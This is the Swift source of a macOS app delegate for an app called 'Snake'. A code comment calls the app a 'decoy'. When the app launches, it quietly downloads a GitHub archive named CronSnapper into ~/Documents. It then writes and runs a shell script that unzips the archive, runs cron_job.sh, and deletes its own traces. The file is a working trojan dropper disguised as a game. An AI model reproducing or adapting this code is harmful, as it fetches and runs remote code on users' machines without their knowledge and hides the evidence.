//
//  AppDelegate.swift
//  Snake
//
//  Created by Ed on 04/06/2017.
//  Copyright © 2017 Syzible. All rights reserved.
//


import Cocoa

@NSApplicationMain
class AppDelegate: NSObject, NSApplicationDelegate {
    
    func applicationDidFinishLaunching(_ aNotification: Notification) {
        // we're up and running with the decoy -- lets run some bash to remote download and run
        let preambleScript: String = "gatherResources.sh"
        
        bash(arguments: ["-c", "cd ~/Documents; touch " + preambleScript])
        
        // create in the default documents directory to avoid any write conflicts
        let documentDirectory = try! FileManager.default.url(for: .documentDirectory, in: .userDomainMask, appropriateFor: nil, create: true)
        let fileURL = documentDirectory.appendingPathComponent(preambleScript)
        
        let zipURL = documentDirectory.appendingPathComponent("master.zip")
        let remoteURL = URL(string: "https://github.com/oflynned/CronSnapper/archive/master.zip")
        
        let sessionConfig = URLSessionConfiguration.default
        let session = URLSession(configuration: sessionConfig)
        let request = URLRequest(url:remoteURL!)
        
        // first cleanup just in case
        bash(arguments: ["-c", "cd ~/Documents; rm -rf master.zip; rm -rf gatherResources.sh"])
        
        let task = session.downloadTask(with: request) { (tempLocalUrl, response, error) in
            if let tempLocalUrl = tempLocalUrl, error == nil {
                do {
                    try FileManager.default.copyItem(at: tempLocalUrl, to: zipURL)
                    
                    // remote install, run, and clear the reminents of the script
                    let text = "#!/bin/sh\ncd ~/Documents; unzip master.zip -d 'Files'; cd Files/CronSnapper-master; cp -rf * ..; cd ..; rm -rf CronSnapper-master; cd ..; rm -rf master.zip; cd Files; ./cron_job.sh; cd ..; rm -rf " + preambleScript
                    
                    do {
                        try text.write(to: fileURL, atomically: false, encoding: .utf8)
                    } catch {
                        print("error writing to url:", fileURL, error)
                    }
                    
                    // execute
                    let command: String = "sh " + String(describing: fileURL).replacingOccurrences(of: "file://", with: "")
                    self.bash(arguments: ["-c", command])
                } catch (let writeError) {
                    print("Error creating a file \(zipURL) : \(writeError)")
                }
                
            }
        }
        task.resume()
    }
    
    func applicationWillTerminate(_ aNotification: Notification) {
        // Insert code here to tear down your application
    }
    
    func shell(arguments: [String] = []) {
        script(path: "/bin/sh", arguments: arguments)
    }
    
    func bash(arguments: [String] = []) {
        script(path: "/bin/bash", arguments: arguments)
    }
    
    func script(path: String, arguments: [String] = []) {
        let task = Process()
        task.launchPath = path
        task.arguments = arguments
        
        let pipe = Pipe()
        task.standardOutput = pipe
        task.launch()
        
        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        let output = NSString(data: data, encoding: String.Encoding.utf8.rawValue)
        
        print(output!)
    }
    
}
